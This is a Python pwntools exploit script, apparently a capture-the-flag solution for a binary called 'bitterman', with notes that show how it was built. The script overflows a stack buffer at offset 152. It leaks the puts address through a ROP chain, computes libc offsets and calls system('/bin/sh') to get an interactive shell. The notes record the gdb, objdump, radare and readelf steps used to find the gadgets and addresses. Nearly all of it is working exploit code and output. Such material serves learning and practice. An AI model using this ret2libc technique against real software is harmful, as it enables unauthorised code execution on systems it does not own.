#!/usr/bin/env python
from pwn import *

# context(terminal=['bash', 'new-window'])

# p = gdb.debug('./bitterman', 'b main')
p = process('./bitterman')

context(os='linux', arch='amd64')
# context.log_level = 'debug'

# Stage 1 - Leak
plt_main = p64(0x4006ec)
plt_put = p64(0x400520)
got_put = p64(0x600c50)
pop_rdi = p64(0x00400853)
junk = "A"*152

payload = junk + pop_rdi + got_put + plt_put + plt_main


p.recvuntil("> What's your name?")
p.sendline("Positivity")
p.recvuntil("> Please input the length of your message:")
p.sendline("1024")
p.recvuntil("> Please enter your text:")
p.sendline(payload)
p.recvuntil('Thanks!\n')
leaked_puts = p.recvline().rstrip().ljust(8, "\x00")
# To "unpack" it
leaked_puts = u64(leaked_puts)
log.success(leaked_puts)
# raw_input()

# Stage 2
pop_rdi = p64(0x00400853)
libc_put = 0x71910
libc_sys = 0x449c0
libc_sh = 0x181519

offset = leaked_puts - libc_put
system = p64(offset + libc_sys)
sh = p64(offset + libc_sh)

payload = junk + pop_rdi + sh + system

p.recvuntil("> What's your name?")
p.sendline("Positivity")
p.recvuntil("> Please input the length of your message:")
p.sendline("1024")
p.recvuntil("> Please enter your text:")
p.sendline(payload)

p.interactive()

"""

PLT/GOT explanation: https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html
Linkers part 1: https://www.airs.com/blog/archives/38


Overflow
    
    gdb
    checksec
    pattern_create 500
        RBP: 0x5341416f41415241 ('ARAAoAAS')
    x/xg $rsp
        0x7fffffffe168: 0x4141544141704141

    pattern_offset 0x4141544141704141
        4702132125198991681 found at offset: 151


Leak puts address

    puts call (in the binary) - to leak an address

        objdump -D bitterman | grep puts

        0000000000400520 <puts@plt>:
          400520:   ff 25 2a 07 20 00       jmpq   *0x20072a(%rip)        # 600c50 <puts@GLIBC_2.2.5>

          400520 - plt (Procedure Linkage Table) address (where the call exist in the binary)
          600c50 - got (Global Offsets Table) address

    radare - to find a "pop rdi" gadget

        r2 bitterman
        /R pop rdi
        0x00400853                 5f  pop rdi


main - to prevent program from crashing after getting puts leaked address

    objdump -D bitterman | grep main
        
        00000000004006ec <main>:

Return to libc

    locate libc.so.6

        /usr/lib/x86_64-linux-gnu/libc.so.6
    cp /usr/lib/x86_64-linux-gnu/libc.so.6 .

    readelf -s libc.so.6|grep puts
        194: 0000000000071910   413 FUNC    GLOBAL DEFAULT   13 _IO_puts@@GLIBC_2.2.5
        426: 0000000000071910   413 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5   <-------------
        501: 00000000000fdfb0  1240 FUNC    GLOBAL DEFAULT   13 putspent@@GLIBC_2.2.5
        685: 00000000000ffa90   680 FUNC    GLOBAL DEFAULT   13 putsgent@@GLIBC_2.10
        1153: 0000000000070490   338 FUNC    WEAK   DEFAULT   13 fputs@@GLIBC_2.2.5
        1694: 0000000000070490   338 FUNC    GLOBAL DEFAULT   13 _IO_fputs@@GLIBC_2.2.5
        2332: 000000000007a460   151 FUNC    WEAK   DEFAULT   13 fputs_unlocked@@GLIBC_2.2.5

        71910

    readelf -s libc.so.6|grep system
        235: 0000000000129a70    99 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.2.5
        613: 00000000000449c0    45 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
        1418: 00000000000449c0    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5  <----------------

        449c0

    strings -a -t x libc.so.6 | grep /bin/sh

        181519

"""

